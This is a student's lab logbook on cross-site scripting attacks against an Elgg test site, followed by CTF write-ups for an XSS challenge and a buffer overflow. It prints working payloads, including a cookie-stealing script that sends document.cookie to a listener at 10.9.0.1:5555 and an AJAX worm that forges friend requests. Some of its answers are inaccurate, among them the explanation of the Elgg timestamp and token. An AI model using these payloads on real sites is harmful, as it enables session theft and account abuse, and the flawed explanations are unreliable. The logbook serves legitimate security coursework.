# LOGBOOK10

## Tasks

### Task 1: Posting a Malicious Message to Display an Alert Window

> The objective of this task is to embed a JavaScript program in your Elgg profile, such that when another user views your profile, the JavaScript program will be executed and an alert window will be displayed.

The first step is to log in to the Elgg website as one of the given users, we used the credentials `samy` `seedsamy` to log in as Samy. Then, navigating to the Profile page, then the Edit Profile page and typed the code `<script>alert('XSS');</script>` into one of the profile fields that is loaded on the Profile page, as this is required for the script to be run when other users visit it.

![](https://i.imgur.com/JpGuXYX.png)

After saving, when visiting this user's page as any user, the alert is shown.

![](https://i.imgur.com/DweiaHs.png)


### Task 2: Posting a Malicious Message to Display Cookies

> The objective of this task is to embed a JavaScript program in your Elgg profile, such that when another user views your profile, the user’s cookies will be displayed in the alert window. 

Following the same steps as the previous task, only by using the following code `<script>alert(document.cookie);</script>`, the user's cookies will be shown. The Elgg variable which is probably the site's user session cookie is different for every user that triggers this action, as one would expect.

![](https://i.imgur.com/kqcJgBH.png)


![](https://i.imgur.com/KaIpj1g.png)


### Task 3: Stealing Cookies from the Victim’s Machine

> In the previous task, the malicious JavaScript code written by the attacker can print out the user’s cookies, but only the user can see the cookies, not the attacker. In this task, the attacker wants the JavaScript code to send the cookies to himself/herself.

The first step is to setup a terminal that will listen to the request with the 'stolen' information. We do this with the following command: `nc -l 5555`
Then we setup the attack, by editing Samy's profile with the following code, that will embed the user's cookies on an `<img>` tag, that upon being loaded sends this information to the attacker:

`<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '   >');</script>`

![](https://i.imgur.com/N1KVI6g.png)

The user's cookies are visible in the GET request's data.

### Task 4: Becoming the Victim’s Friend

> In this and next task, we will perform an attack similar to what Samy did to MySpace in 2005 (i.e. the Samy Worm). We will write an XSS worm that adds Samy as a friend to any other user that visits Samy’s page.

The first step is to find out the structure of a friend request sent by the website. This is done using the recommended firefox extension HTTP Header Live.

![](https://i.imgur.com/mMFQzBc.png)

From inspecting the caught request, this is the result:

`http://www.seed-server.com/action/friends/add?friend=57&__elgg_ts=1641337053&__elgg_token=QKGYnXwM5i319NhplqNrsw&__elgg_ts=1641337053&__elgg_token=QKGYnXwM5i319NhplqNrsw`

Evidently, the arguments needed for a friend request are the target user's ID, the timestamp and the token of the user sending the request. 
After inspecting Samy's profile page to find his ID, we can change our payload building code:


``` 
<script type="text/javascript">
window.onload = function() {
	var Ajax = null;

	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;

	// Construct the HTTP request to add Samy as a friend.
	var sendurl="http://www.seed-server.com/action/friends/add?friend=" + "59" + ts + token + ts + token; 

	// Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.send();
}
</script>
```

We can then embed this script in Samy's page (be it by using the 'About Me' section's HTML edit zone or other fields like the 'Brief Description' field). After this, any user that visits his page and unwillingly executes this code will send a request to Samy and become his friend.

#### Question 1: Explain the purpose of Lines ➀ and ➁, why are they are needed?
Line 1 corresponds to the timestamp. It is necessary to allow the client to adjust its retransmission intervals.

Line 2 is the Elgg token. It allows the user to fetch resources without the need to use their login information constantly, as it is set upon login and stored in the browser's cookies.

#### Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

The "About Me" section uses a rich-text editor that is doing some input sanitization, namely to disallow the use of the normal `<>` characters. With this, HTML tags can't be created and thus, code cannot be inserted by just typing it into the field. However, we found that by editing the HTML div itself with our malicious code, this step could be circunvented, and an attack still executed.

![](https://i.imgur.com/L3qDqna.png)


![](https://i.imgur.com/wsMDhth.png)


## CTF Semana 10

### Desafio 1

The way to the flag in this challenge is to make the administrator aprove our request. We have access to the same page the administrator does, and we can see that there are 2 buttons, one that aproves the request for a flag and one that doesn't. All we have to do is change the behaviour of the latter to execute the behaviour of the former.

The input is clearly vulnerable to an XSS attack, since no sanitization is done to it. Thus, we can insert code that will be ran on load and will change the behaviour of the 'Mark request as read' button to the one of the 'Give the flag' button.

```
<script>
window.onload = function() { 
    var flag = document.getElementById('giveflag'); 
    var button = document.getElementById('markAsRead'); 
    button.disabled = false; 
    button.onclick = flag.click(); 
    button.parentElement.parentElement.action="" 
} 
</script>
```

We got the flag `flag{609b640aba15d02ae72968b32da93e19}`

## Desafio 2

First off, by running checksec we can see that the program has no canaries, RELRO and NX disabled, but has PIE. This means that the program can be ran anywhere in memory, or doesn't need to be in an absolute position to work.

![](https://i.imgur.com/uFZnZWO.png)

By inspecting the code, we find a vulnerability on line 12, the call `gets(buffer)` will read until a newline or EOF is found, giving way to a buffer overflow.

The fact the program has PIE enabled will make it so we can't predict where the target buffer will be in memory, and in the script we'll need to read the information the program prints on line 8.

The next step is calculating the difference between the `$ebp` and the frame address using gdb, which in this case was 104

![](https://i.imgur.com/0z58J4Y.png)


The updated code, with the fetching of the address from the output and with the new offset.

![](https://i.imgur.com/Wfmueso.png)


Running the program on the server, we got the flag `flag{210bf4154052cab93637d622bb8e39e5}`
![](https://i.imgur.com/0WZKJ4V.png)
